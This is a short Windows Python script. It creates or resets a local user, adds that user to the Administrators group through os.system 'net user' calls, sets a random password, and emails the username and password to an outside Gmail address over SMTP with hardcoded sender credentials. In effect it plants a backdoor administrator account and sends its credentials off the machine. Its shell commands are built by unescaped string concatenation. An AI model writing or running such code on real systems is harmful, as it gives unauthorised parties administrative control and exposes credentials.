import os
import string
import random

import smtplib                                       
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
                                              
MyAddr = 'emailsender@gmail.com'        # Email Sender
MyPass = 'emailsenderpassword'          # Password Sender                                 
ToAddr = 'emailreceiver@gmail.com'      # Email Receiver
UserName = 'username'                   # Username need to change pass
   
def SendMail(newPass):                                        
    ## Set up the SMTP server                        
    s=smtplib.SMTP(host='smtp.gmail.com', port=587)  
    s.starttls()                                     
    s.login(MyAddr, MyPass)                          

    ## Send mail
    msg=MIMEMultipart()     ## Create a new message
    message = 'User: ' + UserName + '\nPass: ' + newPass

    ## Set up parameters for message
    msg['From']=MyAddr
    msg['To']=ToAddr
    msg['Subject']="New Password"

    ## Add in the message body
    msg.attach(MIMEText(message, "plain"))

    ## Send message
    s.send_message(msg)

    del msg

#########################################################

def SetPass(newPass):
    cmd = 'net user "' + UserName + '" "' + newPass + '"'
    os.system(cmd)

def SetNewUser():
    ## Create new user
    cmd = 'net user ' + UserName + ' /add'
    os.system(cmd)

    ## Add user to Admin group
    cmd = 'net localgroup Administrators ' + UserName + ' /add'
    os.system(cmd)

def CheckUserExist(newPass):
    ## Whether user exist
    cmd = 'net user | find /c "' + UserName + '" > Result.txt'
    os.system(cmd)

    ## Get Result
    with open("Result.txt", "rt") as f:
        result = f.read()
    os.system('del Result.txt')

    ## If count=0 -> user non-existed -> Create new user
    if result=='0\n':
        SetNewUser()
    SetPass(newPass)

#########################################################

if __name__=="__main__":
    newPass = ""
    for i in range(0,6):
        newPass += random.choice(string.ascii_letters)

    ## Execute
    CheckUserExist(newPass)
    SendMail(newPass)


    









